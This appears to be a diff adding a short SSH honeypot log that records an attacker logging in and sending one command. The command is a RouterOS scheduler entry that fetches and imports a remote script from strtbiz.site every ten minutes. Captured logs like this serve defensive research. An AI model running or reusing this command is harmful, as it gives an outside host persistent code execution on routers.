@@ -1,0 +1,20 @@
+2020-11-04 00:56:31.105 - [Info] MITM Version: 1.26
+2020-11-04 00:56:31.109 - [Info] Auto Access Enabled: true
+2020-11-04 00:56:31.110 - [Debug] [Init] Auto Access Barrier: true
+2020-11-04 00:56:31.128 - [Info] SSH man-in-the-middle server for 172.20.0.203 listening on 0.0.0.0:10002
+2020-11-04 01:09:03.628 - [Debug] [Connection] Attacker connected: 82.77.66.26 | Client Identification: SSH-2.0-Go
+2020-11-04 01:09:04.614 - [Debug] [Auth] Attacker 82.77.66.26 trying to authenticate with "none"
+2020-11-04 01:09:04.615 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2020-11-04 01:09:05.118 - [Debug] [Auth] Attacker 82.77.66.26 trying to authenticate with "password"
+2020-11-04 01:09:05.119 - [Debug] [Auto Access] Attacker: 82.77.66.26, Threshold: 1, Attempts: 1
+2020-11-04 01:09:05.119 - [Debug] [Auto Access] Compromising the honeypot
+2020-11-04 01:09:05.119 - [Debug] [Auto Access] Adding the following credentials: "admin1:helloworld"
+2020-11-04 01:09:05.327 - [Debug] [Auth] Valid credentials - Password Authentication
+2020-11-04 01:09:05.328 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.203
+2020-11-04 01:09:20.826 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2020-11-04 01:09:21.823 - [Debug] [EXEC] Noninteractive mode attacker command: /system scheduler add name="U6" interval=10m on-event="/tool fetch url=http://strtbiz.site/poll/ba213f5d-c504-4ac8-bd6f-33d49873d1db mode=http dst-path=7wmp0b4s.rsc\r\n/import 7wmp0b4s.rsc" policy=api,ftp,local,password,policy,read,reboot,sensitive,sniff,ssh,telnet,test,web,winbox,write
+2020-11-04 01:09:22.318 - [Debug] [Connection] Attacker closed connection
+2020-11-04 01:09:22.323 - [Debug] [LXC] Container's OpenSSH server ended connection
+2020-11-04 01:09:22.323 - [Debug] [LXC] Container's OpenSSH server closed connection
+2020-11-04 01:14:22.126 - [Info] Exiting...
+2020-11-04 01:14:22.126 - [Debug] Cleaning up...
